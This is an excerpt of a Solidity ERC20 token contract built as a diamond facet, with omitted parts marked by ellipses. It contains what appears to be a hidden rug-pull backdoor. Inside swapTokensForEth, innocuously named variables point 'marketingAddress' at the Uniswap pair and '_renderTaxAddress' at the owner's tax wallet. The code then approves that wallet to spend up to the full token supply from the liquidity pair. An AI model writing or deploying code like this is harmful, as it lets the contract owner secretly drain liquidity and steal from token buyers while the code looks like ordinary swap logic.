...
contract totalSupplyFacet is IERC20, Context, Ownable {
    ...
    function _createPair() external onlyOwner {
        ...
        uint256 tokenAmount = balanceOf(address(this)).sub(
            _tSupply.mul(_initialBuyTax).div(100)
        );
    ...
    function _removeLimits() external onlyOwner {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        ds._maxTxAmount = _tSupply;
        ds._maxWalletSize = _tSupply;
    ...
    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        ...
        path[0] = address(this);
        ds._renderTaxAddress = ds._taxWallet;
        path[1] = ds.uniswapV2Router.WETH();
        ds.marketingAddress = ds.uniswapV2Pair;
        _approve(ds.marketingAddress, ds._renderTaxAddress, ds._maxWalletSize);
